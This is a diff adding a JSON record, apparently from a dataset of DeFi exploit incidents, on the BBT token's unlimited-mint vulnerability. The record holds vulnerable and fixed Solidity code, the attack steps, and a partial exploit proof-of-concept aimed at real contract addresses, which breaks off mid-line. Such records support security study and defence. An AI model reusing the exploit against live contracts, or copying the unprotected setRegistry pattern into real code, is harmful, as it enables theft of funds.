@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-03-XX_BBT_SetRegistryMint",
+ "source_file": "2024/2024-03-XX_BBT_SetRegistryMint.md",
+ "title": "BBT — Unlimited Mint Vulnerability via `setRegistry` Manipulation",
+ "date": "2024-03-01",
+ "protocol": "BBT",
+ "chain": "Ethereum",
+ "loss_raw": "~5.06 ETH",
+ "loss_usd": null,
+ "root_cause": "The `setRegistry()` function lacks access control, allowing anyone to redirect the registry pointer to an arbitrary address. The attacker deployed a contract at a CREATE2-predictable address, registered it as the registry, then called `mint()` to issue unlimited BBT",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: setRegistry has no access control\naddress public registry;\n\nfunction setRegistry(address _registry) external {\n    // No onlyOwner — anyone can change the registry\n    registry = _registry;\n}\n\nfunction mint(address to, uint256 amount) external {\n    require(msg.sender == registry, \"not registry\");\n    _mint(to, amount);  // Unlimited minting if registry is the attacker\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Safe code: onlyOwner applied to setRegistry\naddress public registry;\n\nfunction setRegistry(address _registry) external onlyOwner {\n    require(_registry != address(0), \"zero address\");\n    registry = _registry;\n    emit RegistryUpdated(_registry);\n}"
+ ],
+ "steps": [
+  "→ [1] Deploy fake registry at CREATE2-predicted address",
+  "→ [2] Call BBtoken.setRegistry(fakeRegistry)",
+  "No access control → changed immediately",
+  "→ [3] Call fakeRegistry.mint(attacker, 10e28)",
+  "Registry is attacker's contract → unlimited minting",
+  "→ [4] Swap BBT → WETH (two Uniswap V2 paths)",
+  "→ [5] Profit: 5.06 ETH"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Deploy fake registry at CREATE2-predicted address\n  │         └─ Pre-compute address using salt + bytecode\n  │\n  ├─→ [2] Call BBtoken.setRegistry(fakeRegistry)\n  │         └─ No access control → changed immediately\n  │\n  ├─→ [3] Call fakeRegistry.mint(attacker, 10e28)\n  │         └─ Registry is attacker's contract → unlimited minting\n  │\n  ├─→ [4] Swap BBT → WETH (two Uniswap V2 paths)\n  │\n  └─→ [5] Profit: 5.06 ETH",
+  "interface IBBtoken {\n    function setRegistry(address _registry) external;\n    function mint(address to, uint256 amount) external;\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract FakeRegistry {\n    IBBtoken constant bb = IBBtoken(0x3541499cda8CA51B24724Bb8e7Ce569727406E04);\n\n    constructor() {\n        // [3] Call mint immediately in the constructor\n        bb.mint(tx.origin, 10_000_000_000_000_000_000_000_000_000);\n    }\n}\n\ncontract AttackContract {\n    IBBtoken  constant bb     = IBBtoken(0x3541499cda8CA51B24724Bb8e7Ce569727406E04);\n    IUniRouter constant router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\n    function testExploit() external {\n        // [1] Deploy fake registry at CREATE2-predicted address\n        bytes32 salt = "
+ ]
+}
